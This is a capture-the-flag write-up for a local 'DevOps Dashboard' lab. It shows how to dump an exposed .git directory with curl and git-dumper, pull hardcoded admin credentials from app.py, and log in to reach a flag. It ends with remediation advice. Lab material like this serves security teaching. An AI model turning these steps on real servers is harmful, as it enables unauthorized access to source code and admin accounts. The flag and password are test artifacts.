# DevOps Dashboard - Solution Writeup

## Overview

This challenge exploits a 2-vulnerability chain:
1. **Exposed .git directory** - Allows downloading the application source code
2. **Hardcoded credentials** - Source code contains admin credentials

## Step 1: Reconnaissance

Visiting the target at `http://localhost:8080`, we see a DevOps dashboard showing service statuses. There's a login page at `/login` for admin access.

Basic enumeration reveals an exposed `.git` directory:

```bash
curl http://localhost:8080/.git/
```

This returns a directory listing, confirming the git repository is accessible.

## Step 2: Dump the Git Repository

Use `git-dumper` to download the exposed repository:

```bash
# Install git-dumper
pip install git-dumper

# Dump the repository
git-dumper http://localhost:8080/.git/ ./dumped_repo
```

Alternatively, manually download key files:

```bash
# Download git objects
curl http://localhost:8080/.git/HEAD
curl http://localhost:8080/.git/config
curl http://localhost:8080/.git/index

# Get the commit hash from HEAD
curl http://localhost:8080/.git/refs/heads/main

# Download objects based on hash (first 2 chars = folder, rest = filename)
# Example: hash abc123... -> .git/objects/ab/c123...
```

## Step 3: Extract Credentials from Source Code

After dumping the repository, examine the source code:

```bash
cd dumped_repo
cat app.py
```

In `app.py`, we find hardcoded credentials:

```python
# TODO: Move these to environment variables before production deployment
# Jira integration for ticket sync
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "d3v0ps_4dm1n_p4ss!"  # Temporary password - change later
```

## Step 4: Login and Capture the Flag

Use the extracted credentials to login:

1. Navigate to `http://localhost:8080/login`
2. Enter:
   - Username: `admin`
   - Password: `d3v0ps_4dm1n_p4ss!`
3. Access the admin panel
4. The flag is displayed under "System Secrets"

## Flag

```
FLAG{g1t_3xp0sur3_l34ds_t0_cr3d_l34k}
```

## Vulnerability Chain Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                     VULNERABILITY CHAIN                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   [1] Exposed .git Directory                                    │
│       └── Nginx misconfiguration serves /.git/                  │
│           └── Attacker dumps repository contents                │
│                                                                 │
│                          ▼                                      │
│                                                                 │
│   [2] Hardcoded Credentials in Source                           │
│       └── app.py contains admin username/password               │
│           └── Attacker logs in as admin                         │
│                                                                 │
│                          ▼                                      │
│                                                                 │
│   [FLAG] Admin Panel Access                                     │
│       └── Sensitive API key (flag) exposed                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## Real-World Impact

This vulnerability chain is extremely common in real penetration tests:

1. **Git exposure** is frequently found on production servers where developers deploy directly from git without proper web server configuration.

2. **Hardcoded credentials** are a top finding, especially in rushed deployments where developers intend to "fix it later."

## Remediation

1. Configure web server to deny access to hidden directories:
   ```nginx
   location ~ /\. {
       deny all;
   }
   ```

2. Never hardcode credentials - use environment variables or secrets management.

3. Use `.gitignore` to exclude sensitive files and audit repos before deployment.

4. Implement pre-deployment security checks in CI/CD pipeline.

## Tools Used

- `curl` - HTTP requests
- `git-dumper` - Git repository dumping (https://github.com/arthaud/git-dumper)
- Browser - Web interaction
